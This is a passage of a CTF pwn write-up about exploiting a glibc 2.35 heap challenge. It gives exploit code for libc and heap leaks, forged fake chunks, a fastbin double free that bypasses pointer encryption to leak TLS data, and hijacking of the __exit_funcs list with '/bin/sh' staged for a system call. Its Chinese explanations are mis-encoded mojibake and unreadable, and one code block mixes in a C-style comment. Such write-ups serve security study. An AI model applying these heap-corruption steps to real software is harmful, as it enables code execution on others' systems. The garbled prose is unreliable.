77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>[<a href="https://bbs.kanxue.com/thread-280518.htm#msg_header_h2_1" target="_blank" rel="noopener noreferrer">åŸåˆ›] Glibc-2.35ä¸‹å¯¹tls_dtor_listçš„åˆ©ç”¨è¯¦è§£-Pwn-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>è¿™ä¿©ä¸ªå¤§ä½¬æä¾›äº†ä¸¤ç§æ€è·¯ æˆ‘è¿™è¾¹é‡‡ç”¨çš„Arahat0ä½¬çš„åŠ«æŒ__exit_funcsé“¾è¡¨çš„æ–¹å¼</p></blockquote></li></ul><h4 id="æ³„éœ²libc-heap" tabindex="-1"><a class="header-anchor" href="#æ³„éœ²libc-heap" aria-hidden="true">#</a> æ³„éœ²libc heap</h4><blockquote><p>æœ€ç®€å•çš„ä¸€æ­¥</p></blockquote><p>ç®€å•åœ°é€šè¿‡è®©chunkè¿›å…¥tcacheä¸­ ç„¶åç”³è¯·å›æ¥åˆ©ç”¨chunkä¸­ä¿ç•™æœ‰å…³libcå’Œheapçš„åœ°å€ç„¶åæ¨ç®—å‡ºlibcåŸºåœ°å€å’ŒheapåŸºåœ°å€</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># æ³„éœ²å‡ºchunk</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
base_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1936</span>
base_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">2206944</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>chunkè¿›å…¥unsortedbin</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418132947766.png" alt="image-20240418132947766" tabindex="0" loading="lazy"><figcaption>image-20240418132947766</figcaption></figure></li><li><p>free 8æ—¶ unsortedbinè¿›å…¥topchunk ä½†æ˜¯æ­¤æ—¶ä¿ç•™äº†fd ç­‰ä¿¡æ¯ æˆ‘ä»¬åªéœ€è¦mallocå›æ¥å³å¯</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418133015055.png" alt="image-20240418133015055" tabindex="0" loading="lazy"><figcaption>image-20240418133015055</figcaption></figure></li><li><p>ç”³è¯·å›æ¥</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418133239908.png" alt="image-20240418133239908" tabindex="0" loading="lazy"><figcaption>image-20240418133239908</figcaption></figure></li><li><p>ç„¶åwriteç›´æ¥æ³„éœ²å³å¯</p></li></ul><h4 id="ä¼ªé€ fake-chunk" tabindex="-1"><a class="header-anchor" href="#ä¼ªé€ fake-chunk" aria-hidden="true">#</a> ä¼ªé€ fake chunk</h4><blockquote><p>æœ€æ¶ˆè€—æ—¶é—´çš„ä¸€æ­¥</p></blockquote><ul><li>è¿™é‡Œæ¯”è¾ƒéº»çƒ¦çš„å°±æ˜¯fakechunk è¿™é‡Œæˆ‘ä»¬å°†è®°å½•ä¿¡æ¯çš„chunkç§°ä¹‹ä¸º<code>å¤´chunk </code>è®°å½•<code>å†…å®¹chunk</code>çš„size isUsed point</li><li><code>point</code>æŒ‡å‘çš„å°±æ˜¯<code>å†…å®¹chunk</code></li></ul><p>ä¸ºäº†ç»•è¿‡isUsedçš„æ£€æµ‹ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>delete</code>åæ²¡æœ‰æ¸…ç©ºçš„ç‰¹æ€§å°†åŸæœ¬çš„<code>å¤´chunk</code>è¦†ç›–æ‰ è¿™æ ·å°±èƒ½éšæ„æ§åˆ¶<code>isUsed</code>å’Œ<code>point</code>äº† å®ç°ä»»æ„free æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©è§¦å‘<code>fastbinçš„åˆå¹¶</code> æ¥è®©åŸæœ¬çš„å¤´chunkä¹‹é—´ç›¸äº’åˆå¹¶ ç„¶åæˆ‘ä»¬é€šè¿‡mallocæŒ‡å®šå¤§å°çš„chunkæ¥åˆ†å‰²è¿™ä¸ªchunk æ§åˆ¶<code>å†…å®¹chunk</code>åˆšå¥½ä¸ºåŸæœ¬æŸä¸€ä¸ªçš„<code>å¤´chunk</code></p><h5 id="ç¤ºæ„å›¾" tabindex="-1"><a class="header-anchor" href="#ç¤ºæ„å›¾" aria-hidden="true">#</a> ç¤ºæ„å›¾</h5><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418134333731.png" alt="image-20240418134333731" tabindex="0" loading="lazy"><figcaption>image-20240418134333731</figcaption></figure><ul><li>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å‘content chunkå†™å…¥å†…å®¹åŠ«æŒhead chunkäº† åŸç†å¾ˆç®€å• ä½†æ˜¯ç°åœ¨å°±è¦æƒ³åŠæ³•è§¦å‘fastbinä¸­çš„åˆå¹¶æœºåˆ¶äº†</li></ul><h4 id="fastbinåˆå¹¶æœºåˆ¶" tabindex="-1"><a class="header-anchor" href="#fastbinåˆå¹¶æœºåˆ¶" aria-hidden="true">#</a> fastbinåˆå¹¶æœºåˆ¶</h4><ul><li><p>èŒƒå›´:2.35</p><ul><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç”³è¯·large bin chunk æ¥è§¦å‘åˆå¹¶</li><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡è®©topchunkæ¶ˆè€—å®Œæ¯• ç„¶åè§¦å‘åˆå¹¶</li></ul></li><li><p>ç”±äºæˆ‘ä»¬æœ€å¤§ç”³è¯·128 ä¹Ÿå°±æ˜¯0x90å¤§å°çš„chunk æ˜¾ç„¶ç¬¬ä¸€ç§æˆ‘ä»¬æ˜¯æ²¡åŠæ³•ç›´æ¥ç”³è¯·large chunk</p><blockquote><p>Arahat0å¸ˆå‚…æé†’ä¿º æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘scanfè¾“å…¥å¤§é‡æ•°æ® æ¥è®©scanf mallocä¸€ä¸ªlarge chunk ç„¶åè§¦å‘åˆå¹¶ ä½†æ˜¯åŒæ—¶ä¹Ÿä¼šå¯¼è‡´ç¼“å†²åŒºä¸€å †æ•°æ®å¯¼è‡´åç»­çš„scanfå¤±çµ æ‰€ä»¥ä¸ºäº†æ–¹ä¾¿æ§åˆ¶ æˆ‘é€‰æ‹©äº†å°†topchunkæ¶ˆè€—å®Œæ¯•è§¦å‘åˆå¹¶çš„æ–¹å¼</p></blockquote></li><li><p>è¿ç»­ç”³è¯·å¤§é‡chunk æ¶ˆè€—topchunkåˆ°sizeä¸ºä¸€ä¸ªè¾ƒå°å€¼ ç„¶ååœ¨æœ€åç”³è¯·chunk å¹¶ä¸”free chunk è®©chunkè¿›å…¥fastbiné“¾ä¸­ ç„¶åmallocä¸€ä¸ªè¾ƒå¤§çš„chunk å½»åº•æ¶ˆè€—topchunk è§¦å‘fastbinçš„åˆå¹¶</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># tcache 0x20 0x90å‡å­˜æ»¡</span>
<span class="token comment"># å‰©ä¸‹0xf3c7d0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">760</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>
<span class="token comment"># é˜²æ­¢fastbinåˆå¹¶åç›´æ¥è¢«topchunkåˆå¹¶ </span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>åˆå¹¶ä¹‹å‰</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418151026231.png" alt="image-20240418151026231" tabindex="0" loading="lazy"><figcaption>image-20240418151026231</figcaption></figure></li><li><p>åˆå¹¶å</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418151102406.png" alt="image-20240418151102406" tabindex="0" loading="lazy"><figcaption>image-20240418151102406</figcaption></figure></li></ul><h4 id="æ„é€ fakecchunk" tabindex="-1"><a class="header-anchor" href="#æ„é€ fakecchunk" aria-hidden="true">#</a> æ„é€ fakecchunk</h4><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>fakechunk <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;prev_size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;chunk_list_size&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;isUsed&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token operator">//</span> ä¸ºè§¦å‘æ³„éœ²tls<span class="token operator">+</span><span class="token number">0x30</span>çš„double freeçš„fastbinchunkåœ°å€
fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span>
<span class="token comment"># å·²ç»å®Œæˆè¦†å†™ free index5åˆ™å¯å®ç°ä»»æ„free</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;prev_size&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;size&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;chunk_list_size&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;isUsed&quot;</span><span class="token punctuation">]</span><span class="token operator">+</span>fakechunk<span class="token punctuation">[</span><span class="token string">&quot;buff&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>æ­¤æ—¶indexä¸º5 å°±æ˜¯æˆ‘ä»¬åŠ«æŒçš„<code>å¤´chunk</code> è¿™é‡Œçš„fdå°±æ˜¯æˆ‘ä»¬åé¢è¦freeçš„ä»»æ„chunk</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240418151731938.png" alt="image-20240418151731938" tabindex="0" loading="lazy"><figcaption>image-20240418151731938</figcaption></figure></li></ul><h4 id="æ³„éœ²tls-0x30" tabindex="-1"><a class="header-anchor" href="#æ³„éœ²tls-0x30" aria-hidden="true">#</a> æ³„éœ²tls+0x30</h4><blockquote><p>ç”±äºè¦æ³„éœ²tls+0x30å¤„çš„åœ°å€ ä»è€Œæ¥æ³„éœ²å‡ºkeyå€¼ æ–¹ä¾¿æˆ‘ä»¬å»åŠ«æŒexit_funcsé“¾è¡¨ æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªdouble freeæ¥mallocä¸‹æ¥tlsé™„è¿‘çš„å†…å­˜åŒºåŸŸ</p></blockquote><ul><li><p>éš¾ç‚¹</p><ul><li>æˆ‘ä»¬éœ€è¦æ§åˆ¶å†…å­˜å¯¹é½ å¹¶ä¸”è¿˜ä¸èƒ½ç ´ååˆ°äº†canaryçš„å€¼ æ‰€ä»¥æˆ‘ä»¬double freeåŠ«æŒçš„chunkå¤§å°éœ€è¦å¤Ÿå¤§</li><li>å®è·µå‘ç°è¿™æ ·ä¼šå¯¼è‡´tcacheä¸­å®ƒæ ‡æ³¨çš„chunkæ•°é‡å’Œå®é™…çš„æ•°é‡å¹¶ä¸å¯¹åº” å¦‚æœç›´æ¥å°†fdå¡«å†™ä¸ºtlså¤„åœ°å€ åç»­çš„mallocå¤±æ•ˆ å› ä¸ºtlså¤„çš„fdä½ç½®æˆ‘ä»¬å¹¶æ²¡æœ‰åŠæ³•æ§åˆ¶ å¤§æ¦‚ç‡ä¼šæ˜¯å†…å­˜ä¸å¯¹é½/å†…å­˜ä¸å¯å†™ æ‰€ä»¥æˆ‘ä»¬éœ€è¦åç»­çš„malloc</li><li>glibc2.35ä¸‹å­˜åœ¨fdåŠ å¯†æœºåˆ¶ æˆ‘ä»¬çš„fdéœ€è¦ç»è¿‡ä¸(base_heap&gt;&gt;12)è¿›è¡Œå¼‚æˆ–æ“ä½œ æ‰æ˜¯åˆæ³•çš„fdæ‰èƒ½å¤Ÿè¢«æ­£å¸¸è§£æ è€Œä¸”ç»è¿‡æµ‹è¯•ä»¿ä½›è¿™é‡Œçš„base_heapä¼šå› ä¸ºæˆ‘ä»¬æ¶ˆè€—topchunkä¸€æ¬¡è€Œå‘ç”Ÿç»†å¾®çš„æ”¹å˜ æ‰€ä»¥éœ€è¦gdbæ‰‹åŠ¨è°ƒè¯•è®¡ç®—å‡ºåå·®</li></ul></li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># æ„é€ ä¸€ä¸ªdouble free</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token comment"># è¿™ä¸ªchunkæ˜¯ä»¥å‰ä¸ºäº†å½“ä½œè·³æ¿çš„chunk ä½†æ˜¯åé¢åˆ‡æ¢äº†æ€è·¯æ²¡æœ‰ç”¨äº† ä¸ºäº†ä¸å½±å“åç»­çš„heapè®¡ç®—å°±æ²¡æœ‰åˆ é™¤</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token operator">-</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>tls<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>tls<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># æ³„éœ²tlsä¸­ä¿¡æ¯</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>é¦–å…ˆæ˜¯åœ¨fastbinä¸Šæ„é€ å‡ºä¸¤ä¸ªä»¥ä¸Šçš„chunk ç„¶åfreeç¬¬äºŒä¸ªchunk æ¥ç»•è¿‡fastbinä¸­æ£€æŸ¥double freeçš„æœºåˆ¶ï¼ˆfastbinä¼šæ£€æŸ¥ä½ freeçš„æ˜¯å¦ä¸ºç¬¬ä¸€ä¸ªchunkï¼‰</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>__builtin_expect<span class="token punctuation">(</span>old <span class="token operator">==</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	malloc_printerr<span class="token punctuation">(</span><span class="token string">&quot;double free or corruption (fasttop)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token operator">-</span><span class="token operator">&gt;</span>fd <span class="token operator">=</span> PROTECT_PTR<span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token operator">-</span><span class="token operator">&gt;</span>fd<span class="token punctuation">,</span> old<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">*</span>fb <span class="token operator">=</span> p<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240420123457567.png" alt="image-20240420123457567" tabindex="0" loading="lazy"><figcaption>image-20240420123457567</figcaption></figure><ul><li><p>ç„¶åå°†åˆ©ç”¨å¼€å§‹æ„é€ å¥½çš„fakechunkè¿›è¡Œfree</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240420123602766.png" alt="image-20240420123602766" tabindex="0" loading="lazy"><figcaption>image-20240420123602766</figcaption></figure></li></ul><h5 id="fdåŠ å¯†æœºåˆ¶" tabindex="-1"><a class="header-anchor" href="#fdåŠ å¯†æœºåˆ¶" aria-hidden="true">#</a> fdåŠ å¯†æœºåˆ¶</h5><blockquote><p>glibcé«˜ç‰ˆæœ¬åŠ å…¥çš„fdåŠ å¯†æœºåˆ¶ è®©æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥è¦†ç›–fd ç»•è¿‡ä¹Ÿå¾ˆç®€å•æ³„éœ²heapåœ°å€å³å¯</p></blockquote><ul><li>fdéœ€è¦æ˜¯heapåŸºåœ°å€^ç›®æ ‡åœ°å€</li></ul><h4 id="åŠ«æŒexit-funcsé“¾è¡¨" tabindex="-1"><a class="header-anchor" href="#åŠ«æŒexit-funcsé“¾è¡¨" aria-hidden="true">#</a> åŠ«æŒexit_funcsé“¾è¡¨</h4><blockquote><p>æœ€éš¾å´©çš„ä¸€æ­¥ å› ä¸ºæˆ‘ä»¬éœ€è¦åŠ«æŒè¿™ä¸ªé“¾è¡¨æ‰€ä»¥æˆ‘ä»¬éœ€è¦å†ä¸€æ¬¡è§¦å‘fastbinçš„åˆå¹¶æ„é€ double free ç„¶åæŒ‡å‘exit_funcå¤„ è¿›è¡Œè¦†å†™</p><p>æœ¬åœ°æ‰“è¿™ä¸ªæ„Ÿè§‰è¿˜è¡Œ ä½†æ˜¯æ‰“è¿œç¨‹çš„æ—¶å€™æˆ‘è„šæœ¬è¶³è¶³è¦è·‘20åˆ†é’Ÿ å¹¶ä¸”è¿˜å› ä¸ºæ¯”èµ›æ–¹å¹³å°ç½‘ç»œä¸æ˜¯ç‰¹åˆ«å¥½ å¯¼è‡´æˆ‘åå¤å¤±è´¥ æœ€ç»ˆè·‘äº†ä¸€æ™šä¸Šæ‰è·‘å‡ºæ¥</p></blockquote><ul><li>éš¾ç‚¹ <ul><li>å› ä¸ºä¸Šä¸€æ¬¡double free å¯¼è‡´tcache ä¸­ä¸€æ¡é“¾å·²ç»å­˜åœ¨ä¸€ä¸ªæ— æ•ˆçš„chunkåœ°å€(å¤§æ¦‚ç‡ä¸å¯¹é½) æ‰€ä»¥æˆ‘ä»¬ä¸‹ä¸€æ¬¡double freeçš„æ—¶å€™å°±ä¸èƒ½é€‰æ‹©è¿™ä¸ªsizeå¤§å°çš„é“¾äº†</li></ul></li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># size: 0x20c30</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">758</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add_with_no_chunk<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># å°†topchunkæ¶ˆè€—ç©ºè§¦å‘åˆå¹¶</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>

<span class="token comment"># æŒ‡å®šfree index 6 å¯ä»¥å®ç°ä»»æ„free</span>
<span class="token comment"># free_chunkå°±æ˜¯åç»­æ„é€ double freeçš„chunkåœ°å€</span>
free_chunk <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">271376</span><span class="token operator">+</span><span class="token number">0x10</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># å¡«å†™binshåªæ˜¯ä¸ºäº†åç»­è°ƒç”¨systemå‡½æ•°çš„æ—¶å€™å¯ä»¥æ‰¾ä¸ªåœ°å€æ¥å½“ä½œå‚æ•°</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation">)</span>
